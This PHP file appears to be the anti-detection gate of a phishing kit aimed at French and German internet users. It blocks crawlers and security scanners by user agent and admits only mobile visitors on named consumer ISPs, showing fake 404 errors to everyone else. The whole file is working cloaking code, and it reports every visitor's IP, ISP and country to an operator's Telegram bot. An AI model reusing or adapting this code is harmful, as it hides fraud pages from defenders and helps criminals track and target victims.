<?php 
error_reporting(0);

include('../email.php');

if (!isset($_SESSION)) {
    session_start();  // Ouvrir la session
}

$crawlers = '/007ac9|192.comAgent|360Spider|4seohuntbot|80legs|a6-indexer|Aboundex|AbusiveBot|accelobot|acoonbot|AddThis|ADmantX|AdsBot|adscanner|adbeat|adblade|adeptivemedia|adressendeutschland|adrelevance|adroll|adstxt|adunitsolutions|adversarial-ml|adwatch|adxbid|aggregator:|ahrefsbot|aihitbot|aiohttp|airmailbot|akamai-sitesnapshot|akamai|akamai.netstoragebot|akamaiorigin|alibaba|alisamobile|alligator|almaden|amagit|amznkassocbot|analyzer|android|anonymous|anonymous-bot|answerbot|antabot|antispam|antibot|anysite|AOL|apache-httpclient|AportWorm|appengine-google|arabot|arachmo|archive.org_bot|archive.orgbot|arquivo-web-crawler|asafaweb|aserv|asianbot|Ask Jeeves|aspseek|astickymess|asterias|atnbot|attentio|attrapub|attribution|autoemailspider|autowebdir|avsearch|axelspringer|axiomtelecom|BackDoorBot|backlink-checker|backlinkcrawler|backstreet|backweb|bad-ass|Bad-Neighborhood|Baidu|BaiDuSpider|Bandit|bangbangbot|Barkrowler|batchftp|baypup|bdfetch|beamusupscotty|beautybot|BebopBot|BecomeBot|bedwig|BeebwareDirectory|beetlebot|bender|betaBot|bigbrother|Bigfoot|BigWebDirectory|bingbot|BingPreview|binlar|biocrawler|Bionic|bitlybot|bitvoxybot|bizbot|blackwidow|BLM-Crawler|Blogdigger|bloglines|blogpulse|blogsearch|blogshares|blogslive|blowfish|bluefish|blitzbot|bnf.fr_bot|boitho|boochbot|bookmark-manager|boris|Boston-Project|boutell[-_]bot|boxseabot|BPImageWalker|BpSpider|Brandprotect|Brandprotectbot|brokore|BSDSeekBot|browsershots|btbot|btdigg|builtbottough|bullseye|bumblebee|bunnybot|buscador|Butterfly|buzzbot|byindia|byindia.com|c-sensor|c4-bot|cachedview|calyxinstitute|Camcrawler|CamelStampede|cancerbot|Canon|Canon-WebRecord|captain|careerbot|careerseeker|carleson|casperbot|caster|catexplorador|catfood|ccbot|CCGCrawl|cd-preload|centurybot|cerberian|ceron.jp_bot|cert figleafbot|cfbot|cg-eye|cha0s\/\/net|changedetection|changesbot|Charlotte|Checkbot|checkprivacy|CherryPicker|chinaclaw|cipinetbot|citeseerxbot|abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|cizilla.com|clariabot|clshttp|clushbot|cmsworldmap|coccoc|collapsar|collector|comodo|conceptbot|conducivebot|convera|CoolBot|coolcheck|Copernic|copyscape|copyright-bot|cosmos|Covario-IDS|crawl|CrawlDaddy|crawltrack|cronjob|crossrefbot|crowdflower|Crowsnest|cse.google|cuill|curiousgeorge|curl|currybot|custo|cyberalert|cyberdog|CyberPatrol|cyveillance|d1garabicengine|DA|dailymotion|danishbot|darenet|dasblog|datafountains|DataparkSearch|dataprovider|Daum|davebot|daypopbot|dbot|dc-sakura|dCSbot|deepindex|deepnet|deeptrawl|dejan|deliciousbot|dell\s+sputnik|demandbase-bot|deploybot|dergru|detector|devon|deweb|dgd+bot|diablo|diamond|diamondbot|diavol|digg|diibot|dipsie|disco|discobot|discoverybot|dispatch|dlvr.it|dmoz|DNS|DNS-Digger|DNS-Explorer|dnslookup|docomo|dodgebot|dofus|domaincrawler|domainsbot|domainsproject|domaintools|dotbot|dotnetdotcom|dotspotsbot|download|dragonbot|drupal|dsweb|dtsearch|dualsearch|dumbot|dwaar|dxseeker|e-societyrobot|EARTHCOM|earthquake|EasyDL|EBrowse|ec2linkfinder|eCairn-Grabber|eCatch|eChooseBot|ecxi|EddieBot|EduGovSearch|egothor|eidetica.com|eidetiq|EirGrabber|eladok|electricmonk|elefante|EMail-Extraktor|EmailCollector|emailprospector|emailsiphon|EmailWolf|EMPAS_ROBOT|EnaBot|endeca|endlessjazz|EnigmaBot|enterprise_Search|enterprise_Search\/1.0|envolk|EroCrawler|ESISmartSpider|espider|esribot|EtaoSpider|etscada|eurosoft-bot|eventures|evrinid|exactseek|exalead|exekey|exensa|exif|experteer-bot|explicitnetworks|exploder|exsul|Extractor|extractorpro|EyeNetIE|ez-robot|ezooms|facebookexternalhit|facebook|facebot|facesearch|factbot|fairshare|falcon|falconsbot|faqbot|fast-search-engine|fastbot|fastbot.de|fastenbot|fastsearch|fatbot|faup\stools|favicon|favorg|faxo|FDM|feedburner|feedchecker|feedfetcher|feedjit|feedme|feedreader|Feedster|felix|fetch\sspider|fetchrover|fido|findlink|findthatfile|findxbot|findexa|Fing\sshark|finnishbot|firebat|firefly|firstgov|firstvisit|fisbot|fishbot|flaming|flashcapture|flashget|flint|flipboardproxy|FlipboardProxy|FlipboardRSS|fluffy|fly|flybot|foobot|focused_crawler|fofa|follower|FollowSite|forensiq|fosfor|fotoalbum|FoundBot|fr_crawler|frogsoda|frogtest|frontend|froogle|frontpage|fruitfl|fruitfly|ftpsearch|fuelbot|full_breadth_crawler|funnelback|FunWebProducts|furlbot|g00g1e|g00g1ebot|g10-bot|g2crawler|ganar-visitas|gazz|gcreep|gearman-job-agent|geckobot|generic|genieo|genieo\.com|genieo_crawler|genieouscreenmegod|geocheck|geoedge|geobot|GeonaBot|geonabot|geovantage|gerbil|gestalt|getintent|getintentcrawler|getright|getweb|giant|Gigabot|gigamega|gigibot|gigya|gigya-crawler|goforit|gold|gold crawler|goldfire|gonzo|goofer|googlebot|google-structured-data-testing-tool|google-survey|google-thumbnailer|gosospider|gotit|gozilla|grab|grabber|grabnet|grafula|grapefx|grapeshot|grbot|GreenBrowser|gridbot|grub-client|grub|grub.org|grubcrawler|grupthink|gsa-crawler|gsitecrawler|gslfbot|gsrch|gssbot|guggybot|guidancebot|gulp|GurujiBot|hacker|hadi|halcyon|halliburton|hansendeepLink|harvest|hcat|hclsreport-crawler|healthbot|hedgehog|helsinki|heritrix|hia|highbeam|hijbul-islam|hiqual|hitsniffer|hledej|hmview|hoge|holmes|homepagesearch|Hometown|homogefrontpagebot|hooWWWer|hostcrawler|hsnbot|hsteeler|htdig|htmlparser|httpclient|httpconnect|httpdown|httpget|httpheader|httpinettekce|httplib|httplib2|httpunit|httrack|hul-wax|humanlinks|huronbot|hverify|ia_archiver|iadro|ias[-_]adag|ias[_+|.|_]adag|ias[-_]insights|ibm\stotalaccess|ichiro|iCjobs|iCjobs-crawler|iclloader|icproject|Identify|Id-search|ie6\_autodiscovery|ienrich|iexplore.exe|iGetter|iim_bot|ilsebot|iltrovatore|image|ImageVisualsearch|imagewalker|imorebot|inagist|inbound.li parser|InboundBot|incrawler|IncyWincy|indexer|indexing|industry-brain|inet\scollector|inetbot|inetURL|infobot|infociousbot|infomine|InfoNaviRobot|infospider|infoSpider|InfoTekies|infovortice2013|infoweb-monitor|INGRID|inktomisearch.com|innerpr|insitor|instabid|integrity|intelliseek|InterGET|Internet Ninja|InternetSeer|internetVista monitoring|intelliseek|intelliseek\.\sexplorer|Intraformant|IODC/';

if(preg_match($crawlers, $_SERVER['HTTP_USER_AGENT'])){
    die('This IP address has been detected as bot (Crawler Filters)');
}

function isMobile() {
    return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/", $_SERVER['HTTP_USER_AGENT']);
}



if($AllowComputer == false)
{
    if (!isMobile()) {
        die('HTTP/1.0 404 Not Found');
    }
}

$visitor_ip = $test_mode ? "127.0.0.1" : $_SERVER['REMOTE_ADDR'];

function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip."");
    $ipinfo_json = json_decode($ipinfo, true);

    return $ipinfo_json;
}

$ipinfo_json = getIpInfo($visitor_ip);

$org = $isps = $country = "Introuvable"; // Valeurs par défaut

if ($ipinfo_json['status'] !== 'fail') {
    $org = $ipinfo_json['as'];
    $isps = $ipinfo_json['isp'];
    $country = $ipinfo_json['country'];
}

function SendVisitorMode($emoji) {
    global $org, $isps, $country, $tlg_send, $VisitorMode, $bot_token, $rez_visite;

    $UserIpMsg = "「{$emoji}」IP : {$_SERVER['REMOTE_ADDR']}
「🔍」Org : {$org}
「📡」Isp : {$isps}
「🏴‍☠️」Country - {$country}";

    if ($tlg_send && $VisitorMode && !isset($_SESSION['AldryVisit'])) {
        file_get_contents("https://api.telegram.org/bot{$bot_token}/sendMessage?chat_id={$rez_visite}&text=".urlencode($UserIpMsg));
    }

    $_SESSION['AldryVisit'] = true;
}


if($country == "France" || $country == "Germany" || $visitor_ip == "127.0.0.1")
{
    if (strpos($isps, "wanadoo") || strpos($isps, "bbox") || strpos($isps, "Bouygues") || strpos($isps, "Orange") || 
        strpos($isps, "sfr") || strpos($isps, "SFR") || strpos($isps, "Sfr") || strpos($isps, "free") || strpos($isps, "Free") || 
        strpos($isps, "FREE") || strpos($isps, "red") || strpos($isps, "proxad") || strpos($isps, "club-internet") || 
        strpos($isps, "oleane") || strpos($isps, "nordnet") || strpos($isps, "liberty") || strpos($isps, "colt") || 
        strpos($isps, "chello") || strpos($isps, "belgacom") || strpos($isps, "Proximus") || strpos($isps, "skynet") || 
        strpos($isps, "aol") || strpos($isps, "neuf") || strpos($isps, "darty") || strpos($isps, "bouygue") || 
        strpos($isps, "numericable") || strpos($isps, "Num\303\251ris") || strpos($isps, "Poste") || strpos($isps, "Sosh") || 
        strpos($isps, "Telenet") || strpos($isps, "telenet") || strpos($isps, "sosh") || strpos($isps, "proximus") || 
        strpos($isps, "Belgacom") || strpos($isps, "orange") || strpos($isps, "Skynet") || strpos($isps, "PROXIMUS") || 
        strpos($isps, "Neuf") || strpos($isps, "Numericable") || strpos($isps, "coriolis") || strpos($isps, "cic") || 
        strpos($isps, "poste") || strpos($isps, "mutuel") || strpos($isps, "numericable") || strpos($isps, "icloud private relay") || 
        strpos($isps, "france telecom") || strpos($isps, "proxad network") || strpos($isps, "free sas") || 
        strpos($isps, "bouygues telecom") || strpos($isps, "ldcom") || strpos($isps, "ei-telecom") || strpos($isps, "salt mobile") || 
        strpos($isps, "telenet") || strpos($isps, "scarlet") || strpos($isps, "vodafone") || strpos($isps, "meo") || 
        strpos($isps, "nos") || strpos($isps, "artelecom") || strpos($isps, "altice") || strpos($isps, "telepac") || 
        strpos($isps, "sapo") || strpos($isps, "zon") || strpos($isps, "bbox") || strpos($isps, "club-internet") || 
        strpos($isps, "oleanne") || strpos($isps, "nordnet") || strpos($isps, "liberty") || strpos($isps, "chello") || 
        strpos($isps, "belgacom") || strpos($isps, "skynet") || strpos($isps, "aol") || strpos($isps, "neuf") || 
        strpos($isps, "darty") || strpos($isps, "numericable") || strpos($isps, "oni") || strpos($isps, "digi") || 
        strpos($isps, "deutsche telekom") || strpos($isps, "o2") || strpos($isps, "1&1") || strpos($isps, "congstar") || 
        strpos($isps, "freenet") || strpos($isps, "blau") || strpos($isps, "simyo") || strpos($isps, "aldi talk") || 
        strpos($isps, "lebara") || strpos($isps, "yourfone") || strpos($isps, "nrj mobile") || strpos($isps, "coriolis") || 
        strpos($isps, "la poste mobile") || strpos($isps, "prixtel") || strpos($isps, "syma") || strpos($isps, "auchan") || 
        strpos($isps, "cdiscount") || strpos($isps, "reglo") || strpos($isps, "red by sfr") || strpos($isps, "b&you") || 
        strpos($isps, "cic") || strpos($isps, "mutuel") || strpos($isps, "proxad") || strpos($isps, "colt") || 
        strpos($isps, "datacamp limited") || strpos($isps, "iCloud Private Relay") || 

        strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || 
        strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || 
        strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || 
        strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || 
        strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || 
        strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || 
        strpos($org, "numericable") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || 
        strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || 
        strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || 
        strpos($org, "Neuf") || strpos($org, "Numericable") || strpos($org, "coriolis") || strpos($org, "cic") || 
        strpos($org, "poste") || strpos($org, "mutuel") || strpos($org, "numericable") || strpos($org, "icloud private relay") || 
        strpos($org, "france telecom") || strpos($org, "proxad network") || strpos($org, "free sas") || 
        strpos($org, "bouygues telecom") || strpos($org, "ldcom") || strpos($org, "ei-telecom") || strpos($org, "salt mobile") || 
        strpos($org, "telenet") || strpos($org, "scarlet") || strpos($org, "vodafone") || strpos($org, "meo") || 
        strpos($org, "nos") || strpos($org, "artelecom") || strpos($org, "altice") || strpos($org, "telepac") || 
        strpos($org, "sapo") || strpos($org, "zon") || strpos($org, "bbox") || strpos($org, "club-internet") || 
        strpos($org, "oleanne") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "chello") || 
        strpos($org, "belgacom") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || 
        strpos($org, "darty") || strpos($org, "numericable") || strpos($org, "oni") || strpos($org, "digi") || 
        strpos($org, "deutsche telekom") || strpos($org, "o2") || strpos($org, "1&1") || strpos($org, "congstar") || 
        strpos($org, "freenet") || strpos($org, "blau") || strpos($org, "simyo") || strpos($org, "aldi talk") || 
        strpos($org, "lebara") || strpos($org, "yourfone") || strpos($org, "nrj mobile") || strpos($org, "coriolis") || 
        strpos($org, "la poste mobile") || strpos($org, "prixtel") || strpos($org, "syma") || strpos($org, "auchan") || 
        strpos($org, "cdiscount") || strpos($org, "reglo") || strpos($org, "red by sfr") || strpos($org, "b&you") || 
        strpos($org, "cic") || strpos($org, "mutuel") || strpos($org, "proxad") || strpos($org, "colt") || 
        strpos($org, "datacamp limited") || strpos($org, "iCloud Private Relay") || $visitor_ip == "127.0.0.1") {

        SendVisitorMode("✅");
        $_SESSION['MASTER'] = true;  
    } else { 
        SendVisitorMode("🤖");
        die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country); 
        header("Location: https://www.mediapart.fr/");
    }
} else {
    SendVisitorMode("🏴");
    die('HTTP/1.0 404 Not Found - ' . $country); 
    header("Location: https://www.mediapart.fr/");
}
?>

